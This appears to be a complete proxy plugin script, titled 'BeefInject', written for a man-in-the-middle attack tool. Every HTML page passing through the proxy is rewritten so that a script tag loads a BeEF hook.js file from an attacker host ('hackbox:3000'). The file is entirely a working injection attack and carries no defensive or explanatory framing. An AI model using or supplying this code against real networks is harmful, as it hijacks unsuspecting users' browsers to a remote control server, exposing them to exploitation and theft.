function onLoad() {
    console.log( "BeefInject loaded." );
}

function onResponse(req, res) {
    if( res.ContentType.indexOf("text/html") == 0 ){
        res.Body = res.ReadBody().replace( "</head>", '<script type="text/javascript" src="http://hackbox:3000/hook.js"></script></head>' ); 
    }
}
